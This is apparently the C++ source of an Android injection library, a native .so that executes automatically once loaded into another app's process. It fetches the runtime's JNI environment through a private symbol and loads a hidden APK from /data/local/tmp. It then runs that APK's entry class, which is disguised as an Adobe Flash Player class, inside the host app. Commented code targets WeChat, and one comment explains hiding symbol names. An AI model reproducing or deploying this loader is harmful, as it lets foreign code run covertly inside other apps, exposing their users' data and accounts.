
#include <jni.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <time.h>
#include <android/log.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/file.h>
#include <dirent.h>
#include <android/asset_manager_jni.h>
#include <android/asset_manager.h>
#include <unistd.h>
#include <sys/inotify.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <string>
#include <ctype.h>
#include <iostream>

using namespace std;


JNIEnv * gEnv   = 0;

JavaVM* gJvm    = 0;

#define APK_FILE_NAME           "test.apk"

#define TEST_WORK_PATH          "/data/local/tmp/"

#define MY_LOG_TAG              "[liujinguang]"

#define ENTRANCE_CLASSNAME 		"com.adobe.flashplayer.SoEntry"

#define ENTRANCE_METHODNAME 	"start"

#define LOG_FILE_NAME 			"/sdcard/runningLog.txt"

#define TRUE 					1
#define FALSE 					0

#define DEFAULT_JNI_VERSION 	JNI_VERSION_1_4

//我们需要了解gcc新引进的选项-fvisibility=hidden，这个编译选项可以把所有的符号名（包括函数名和全局变量名）都强制标记成隐藏属性。
//我们可以在Android.mk中可以通过修改LOCAL_CFLAGS选项加入-fvisibility=hidden来做到这一点
//源代码里出现的函数名和全局变量名（符号名）都变成了't'，也就是说都是局部符号（类似于static）
//void__attribute__ ((visibility ("default")))Java_com_example_SanAngeles_DemoRenderer_nativeInit ( JNIEnv*  env )

int writeLogFile(const char * log){
    FILE * fp = fopen(LOG_FILE_NAME,"ab+");
    if(fp == 0){
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"fopen() error");
        return -1;
    }

    time_t time_seconds = time(0);
    struct tm* now_time = localtime((time_t*)&time_seconds);
    char szdatetime[256] = {0};
    int timeloglen = sprintf(szdatetime,"%d-%d-%d %d:%d:%d ", now_time->tm_year + 1900, now_time->tm_mon + 1,
                             now_time->tm_mday, now_time->tm_hour, now_time->tm_min,now_time->tm_sec);

    size_t len = fwrite((const  void*)szdatetime,1,timeloglen,fp);
    int logsize = strlen(log);
    int ret = fwrite(log,1,logsize,fp);
    fclose(fp);
    if(ret != logsize){
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"fwrite() error");
        return -1;
    }

    return 0;
}

int getAndroidVersion(){
    char *key = (char *)"ro.build.version.sdk";
    //char *key = (char *)"ro.build.version.release";
    char value[1024] = {0};
    int ret = __system_property_get(key, value);
    if (ret <= 0 ) {
        return -1;
    }

    int ver = atoi(value);
    return ver;
}

extern "C" JNIEnv* dlsmgetenv()
{
    void*runtime = dlopen("/system/lib/libandroid_runtime.so", RTLD_LAZY|RTLD_GLOBAL);
    JNIEnv*(*getAndroidRuntimeEnv)();
    getAndroidRuntimeEnv= (JNIEnv*(*)())dlsym(runtime, "_ZN7android14AndroidRuntime9getJNIEnvEv");
    return getAndroidRuntimeEnv();
}

unsigned short __ntohs(unsigned short port){
    return ((port&0xff00) >> 8) | ((port & 0xff) << 8);
}

unsigned int __ntohl(unsigned int v){
    return ((v & 0xff000000) >> 24) | ((v & 0xff) << 24) | ((v & 0xff0000) >> 8) | ((v & 0xff00) << 8);
}



extern "C" int jstring2Char(JNIEnv * env,jstring jstr,char * lpbyte,int bytelen)
{
    jclass clsstring = env->FindClass("java/lang/String");
    jmethodID mid = env->GetMethodID(clsstring, "getBytes","(Ljava/lang/String;)[B");

    jstring strencode = env->NewStringUTF("utf-8");
    jbyteArray barr = (jbyteArray) env->CallObjectMethod(jstr, mid, strencode);
    jsize alen = env->GetArrayLength(barr);

    if (alen > 0 && alen < bytelen)
    {
        jbyte* ba = env->GetByteArrayElements(barr, JNI_FALSE);
        memcpy(lpbyte, ba, alen);
        lpbyte[alen] = 0;
        env->ReleaseByteArrayElements(barr, ba, 0);
        return alen;
    }

    return -1;
}


extern "C" jstring char2Jstring(JNIEnv * env,const char* pat,int patlen)
{
    jclass strClass = env->FindClass("java/lang/String");
    jmethodID ctorID = env->GetMethodID(strClass, "<init>","([BLjava/lang/String;)V");
    jbyteArray bytes = env->NewByteArray(patlen);
    env->SetByteArrayRegion(bytes, 0, patlen, (jbyte*) pat);
    jstring encoding = env->NewStringUTF("utf-8");
    return (jstring) env->NewObject(strClass, ctorID, bytes, encoding);
}

extern "C" int getPackageName(JNIEnv *env, jobject obj,char * packname,int len) {

    jclass native_class = env->GetObjectClass(obj);
    jmethodID mId = env->GetMethodID(native_class, "getPackageName", "()Ljava/lang/String;");
    jstring pn = static_cast<jstring>(env->CallObjectMethod(obj, mId));

    int ret = jstring2Char(env,pn,packname,len);

    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"packagename:%s",packname);

    return ret;
}

extern "C" jobject getGlobalContext(JNIEnv *env) {
    jclass activityThread = (env)->FindClass( "android/app/ActivityThread");

    jmethodID currentActivityThread = (env)->GetStaticMethodID( activityThread, "currentActivityThread", "()Landroid/app/ActivityThread;");

    jobject at = (env)->CallStaticObjectMethod( activityThread, currentActivityThread);
    if(at == 0){
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"CallStaticObjectMethod currentActivityThread result 0");
        return 0;
    }

    jmethodID getApplication = (env)->GetMethodID( activityThread, "getApplication", "()Landroid/app/Application;");

    jobject context = (env)->CallObjectMethod( at, getApplication);

    return context;
}

extern "C" int jniLoadApk(JNIEnv * env,const char * workpath){
    int ret = 0;

    char defjarpath[PATH_MAX];
    strcpy(defjarpath,TEST_WORK_PATH);
    strcat(defjarpath,APK_FILE_NAME);

    char optjarpath[PATH_MAX];
    strcpy(optjarpath,TEST_WORK_PATH);

    if(access(defjarpath,F_OK) != 0){
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"access error:%s",defjarpath);
        return 0;
    }else{
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"defaultjarpath:%s,optjarpath:%s",defjarpath,optjarpath);
    }

    jstring jstrdefjarpath = char2Jstring(env,defjarpath,strlen(defjarpath));
    jstring jstroptjarpath = char2Jstring(env,optjarpath,strlen(optjarpath));
    jstring jstrclassname = char2Jstring(env,ENTRANCE_CLASSNAME,strlen(ENTRANCE_CLASSNAME));
    jstring jstrmethodname = char2Jstring(env,ENTRANCE_METHODNAME,strlen(ENTRANCE_METHODNAME));
    jstring jstrworkpath = char2Jstring(env,workpath,strlen(workpath));

    jclass classloader = env->FindClass("java/lang/ClassLoader");
    jmethodID getsysclassloader = env->GetStaticMethodID(classloader, "getSystemClassLoader","()Ljava/lang/ClassLoader;");
    jobject loader = env->CallStaticObjectMethod(classloader,getsysclassloader);

    jclass dexclassloader = env->FindClass("dalvik/system/DexClassLoader");
    jmethodID dexclsldinit = env->GetMethodID(dexclassloader,"<init>","(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
    jobject dexloader = env->NewObject(dexclassloader,dexclsldinit, jstrdefjarpath, jstroptjarpath, 0, loader);

    jclass dexloaderclass = env->GetObjectClass(dexloader);

    jmethodID findclass = env->GetMethodID(dexloaderclass,"loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
    if(NULL==findclass){
        findclass = env->GetMethodID(dexloaderclass,"findClass", "(Ljava/lang/String;)Ljava/lang/Class;");
    }

    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"ClassLoader:%p,getSystemClassLoader:%p,loader:%p,"
                                                       "DexClassLoader:%p,DexClassLoader init:%p,DexClassLoader class:%p,dexloaderclass:%p,findClass:%p",
                                                       classloader,getsysclassloader,loader,dexclassloader,dexclsldinit,dexloader,dexloaderclass,findclass);

    jclass javaenterclass=(jclass)env->CallObjectMethod(dexloader,findclass,jstrclassname);
    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"%s:%p",ENTRANCE_CLASSNAME,javaenterclass);

    jmethodID enterclassinit = env->GetMethodID(javaenterclass, "<init>", "()V");
    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"enterclassinit:%p",enterclassinit);

    jobject enterclassobj = env->NewObject(javaenterclass,enterclassinit);
    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"enterclassobj:%p",enterclassobj);

    //jmethodID entermethodid = env->GetMethodID(javaenterclass, ENTRANCE_METHODNAME, "(Landroid/content/Context;)V");
    jmethodID entermethodid = env->GetMethodID(javaenterclass, ENTRANCE_METHODNAME,"(Landroid/content/Context;Ljava/lang/String;)V");
    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"entermethodid:%p",entermethodid);
    if(entermethodid){
        jclass atclass = env->FindClass("android/app/ActivityThread");
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"atclass:%p",atclass);

        jmethodID catmid = env->GetStaticMethodID(atclass,"currentActivityThread","()Landroid/app/ActivityThread;");
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"catmid:%p",catmid);

        jobject catobj = env->CallStaticObjectMethod(atclass,catmid);
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"catobj:%p",catobj);

        jmethodID getappmid = env->GetMethodID(atclass, "getApplication", "()Landroid/app/Application;");
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"getappmid:%p",getappmid);

        jobject contextobj = env->CallObjectMethod(catobj, getappmid);
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"contextobj:%p",contextobj);

        //env->CallVoidMethod(enterclassobj, entermethodid, contextobj);

        jstring jstrworkpath = char2Jstring(env,TEST_WORK_PATH,strlen(TEST_WORK_PATH));
        env->CallVoidMethod(enterclassobj, entermethodid, contextobj,jstrworkpath);

        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"apk running");

        return 1;
    }else{
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"entermethodid not found");
    }

    return 0;
}


//dlopen do not call JNI_OnLoad,but System.load or System.loadLibrary will do
extern "C" JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* javavm, void* reserved){

    int jniver = DEFAULT_JNI_VERSION;

    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JNI_OnLoad");

    char szlog[PATH_MAX];
    int ret = 0;
    JNIEnv *env = NULL;
    bool bAttached = false;
    if (javavm == NULL){
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JavaVM NULL");
        return jniver;
    }else{
        gJvm = javavm;
        ret = javavm->GetEnv((void**) &env, DEFAULT_JNI_VERSION);
        if (ret < 0){
            __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JavaVM.GetEnv error");

            ret = javavm->AttachCurrentThread(&env, NULL);
            if (ret < 0)
            {
                __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JavaVM.AttachCurrentThread error");
                return jniver;
            }else{
                bAttached = true;
                gEnv = env;
                __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JavaVM.AttachCurrentThread ok");
            }
        }else{
            gEnv = env;
            __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JNIEnv.GetEnv ok");
        }
    }

    char packagename[1024];
    jobject obj = getGlobalContext(env);
    if(obj != 0){
        ret = getPackageName(env,obj,packagename,1024);
    }

    ret = jniLoadApk(env,TEST_WORK_PATH);

    if(bAttached == true){
        javavm->DetachCurrentThread();
        __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JavaVM.DetachCurrentThread ok");
    }
    return jniver;
}


extern "C" JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* javavm, void* reserved){

    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"JNI_OnUnload");
    return;
}


//System.loadLibrary call dlopen->init or initarray, JNI_OnLoad
void __attribute__ ((constructor)) SO_Load(void){

    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"SO_Load");
    printf("SO_Load\r\n");

    int ver = getAndroidVersion();
    if(ver >= 24){
        return;
    }else{
        char szlog[1024];
        JNIEnv * env = dlsmgetenv();
        sprintf(szlog,"android version:%u,dlsmgetenv get jvm env:%p\r\n",ver,env);
        writeLogFile(szlog);
        if(env == 0){
            return;
        }else{
            JavaVM * jvm = 0;
            int ret = env->GetJavaVM(&jvm);
            sprintf(szlog,"get java vm:%p ret:%d\r\n",jvm,ret);

            if(ret < 0){
                return;
            }else{
                ret = JNI_OnLoad(jvm,0);
                //sprintf(szlog,"JNI_OnLoad ret value:%u\r\n",ret);
                //writeLogFile(szlog);
            }
        }
    }

//	char szCmdline[1024];
//	int fs = 0;
//	char * data = 0;
//	int ret = readFile4096((char*)"/proc/self/cmdline",&data,&fs);
//	if(ret == 0){
//		sprintf(szlog,"SO_Load get package name:%s\r\n",data);
//		writeLogFile(szlog,data);
//
//		getPackageNameFromProcessName(data);
//		strcpy(szCmdline,data);
//		delete []data;

//		//if(strstr(szCmdline,"com.tencent.mm")){
//			char workpath[1024] = {0};
//			soinfo gKeepSoInfo = {0};
//			int ret = weixinSoProcess(workpath,"com.tencent.mm",&gKeepSoInfo);
//			printf("SO_Load get workpath:%s,weixinSoProcess ret value:%u\r\n",workpath,ret);
//		//}
//	}else{
//		writeLogFile("SO_Load not found package name\r\n",szCmdline);
//	}

    return;
}


void __attribute__ ((destructor)) SO_Unload(void){
    __android_log_print(ANDROID_LOG_ERROR,MY_LOG_TAG,"SO_Unload");
    printf("SO_Unload\r\n");
    return;
}


extern "C" JNIEXPORT jstring JNICALL Java_com_inject64_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {
    std::string hello = "Hello from C++";
    return env->NewStringUTF(hello.c_str());
}




int getString(char * src,char * hdr,char * end,char * dst,int mode){
    char * lphdr = strstr(src,hdr);
    if(lphdr != 0){

        if(mode){
            lphdr += strlen(hdr);
        }

        char * lpend = strstr(lphdr,end);
        if(lpend != 0){
            int len = lpend - lphdr;
            memmove(dst,lphdr,len);
            *(dst + len) = 0;
            return len;
        }
    }
    return -1;
}





int copyFile(char * srcfn,char * dstfn){
    int ret = 0;
    FILE * fpsrc = fopen(srcfn,"rb");
    if(fpsrc == 0){
        return -1;
    }

    fseek(fpsrc,0,SEEK_END);
    int srcfs = ftell(fpsrc);
    fseek(fpsrc,0,SEEK_SET);

    char * lpbuf = new char[srcfs + 1024];

    ret = fread(lpbuf,srcfs,1,fpsrc);
    fclose(fpsrc);

    FILE * fpdst = fopen(dstfn,"wb");
    if(fpdst == 0){
        delete []lpbuf;
        return -1;
    }

    ret = fwrite(lpbuf,srcfs,1,fpdst);
    fclose(fpdst);
    delete []lpbuf;
    return 0;
}







#define READFILE_LINESIZE 1024

int readFile4096(char * filename,char ** data,int * fs){
    int fd = open(filename,O_RDONLY);
    if(fd < 0){
        __android_log_print(ANDROID_LOG_ERROR,"readFile4096","open file:%s error",filename);
        return -1;
    }

    *fs = READFILE_LINESIZE;
    * data = new char[*fs];

//	char * ptr = *data;
    int ret = 0;
//	do{
    ret = read(fd,*data,READFILE_LINESIZE -1);
//		if(ret > 0){
//			ptr += ret;
//		}else{
//			break;
//		}
//	}while(ret > 0);

    close(fd);
    if(ret <= 0){
        __android_log_print(ANDROID_LOG_ERROR,"readFile4096","read file:%s error",filename);
        return -1;
    }

    *fs = ret;
    *(*data + *fs) = 0;
    return 0;
}

int createFile(char * fn){
    FILE * fp = fopen(fn,"wb");
    if(fp == 0){
        return -1;
    }

    fclose(fp);
    return 0;
}

int writeNewFile(char * filename,char * data,int size){
    FILE * fp = fopen(filename,"wb");
    if(fp == 0){
        return -1;
    }

    int ret = fwrite(data ,1,size,fp);
    fclose(fp);

    return 0;
}

int appendFile(char * filename,char * data,int size){
    FILE * fp = fopen(filename,"ab+");
    if(fp == 0){
        return -1;
    }

    int ret = fwrite(data ,size,1,fp);
    fclose(fp);

    return 0;
}
